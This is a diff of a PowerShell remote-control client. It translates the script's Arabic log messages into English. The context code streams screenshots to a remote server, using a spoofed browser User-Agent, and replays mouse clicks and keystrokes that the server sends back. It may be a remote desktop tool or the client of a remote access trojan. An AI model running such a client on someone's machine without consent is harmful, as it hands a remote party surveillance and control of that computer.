@@ -93,10 +93,10 @@ function Get-Events {
             'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         $response = Invoke-RestMethod -Uri "$SERVER/events_get" -Method Post -Body $jsonBody -ContentType "application/json" -Headers $headers
-        Write-Host "[+] ✅ Get-Events نجح: $($response | ConvertTo-Json -Compress)"
+        Write-Host "[+] Get-Events Success: $($response | ConvertTo-Json -Compress)"
         return $response.events
     } catch {
-        Write-Host "[!] ❌ خطأ في Get-Events: $_"
+        Write-Host "[!] Get-Events Error: $_"
         return $null
     }
 }
@@ -123,17 +123,17 @@ function Compare-ByteArrays {
 }
 
 function Main {
-    Write-Host "[+] محاولة الاتصال بالسيرفر: $SERVER"
+    Write-Host "[+] Connecting to server: $SERVER"
     $jsonBody = "{`"_key`":`"$KEY`"}"
     $connected = Send-JsonRequest -Url "$SERVER/new_session" -JsonBody $jsonBody
     
     if (-not $connected) {
-        Write-Host "[!] فشل الاتصال بالسيرفر!"
+        Write-Host "[!] Failed to connect to server!"
         return
     }
     
-    Write-Host "[+] تم الاتصال بالسيرفر بنجاح!"
-    Write-Host "[+] بدء التقاط الشاشة..."
+    Write-Host "[+] Connected to server successfully!"
+    Write-Host "[+] Starting screen capture..."
     
     while ($true) {
         try {
@@ -147,14 +147,14 @@ function Main {
                 $filename = [DateTimeOffset]::Now.ToUnixTimeMilliseconds().ToString() + "_" + $KEY
                 $result = Send-Image -Filename $filename -ImageData $imageBytes
                 if ($result) {
-                    Write-Host "[+] صورة مرسلة: $filename"
+                    Write-Host "[+] Image sent: $filename"
                 }
                 $PREV_IMG = $imageBytes
             }
             
             $events = Get-Events
             if ($events -ne $null -and $events.Count -gt 0) {
-                Write-Host "[+] عدد الأوامر المستلمة: $($events.Count)"
+                Write-Host "[+] Events received: $($events.Count)"
                 foreach ($e in $events) {
                     if ($e.type -eq "click") {
                         [Win32]::SetCursorPos($e.x, $e.y)
@@ -162,7 +162,7 @@ function Main {
                         [Win32]::mouse_event($MOUSEEVENTF_LEFTDOWN, $e.x, $e.y, 0, [UIntPtr]::Zero)
                         Start-Sleep -Milliseconds 20
                         [Win32]::mouse_event($MOUSEEVENTF_LEFTUP, $e.x, $e.y, 0, [UIntPtr]::Zero)
-                        Write-Host "[+] ✅ تم تنفيذ النقر عند ($($e.x), $($e.y))"
+                        Write-Host "[+] Click executed at ($($e.x), $($e.y))"
                     }
                     
                     if ($e.type -eq "keydown") {
@@ -176,13 +176,13 @@ function Main {
                             $cmd += "{" + $e.key.ToUpper() + "}"
                         }
                         Send-Keys -Keys $cmd
-                        Write-Host "[+] ✅ تم إرسال المفتاح: $cmd"
+                        Write-Host "[+] Key sent: $cmd"
                     }
                 }
             }
             Start-Sleep -Milliseconds 200
         } catch {
-            Write-Host "[!] ❌ خطأ في الحلقة: $_"
+            Write-Host "[!] Error in loop: $_"
             Start-Sleep -Milliseconds 1000
         }
     }
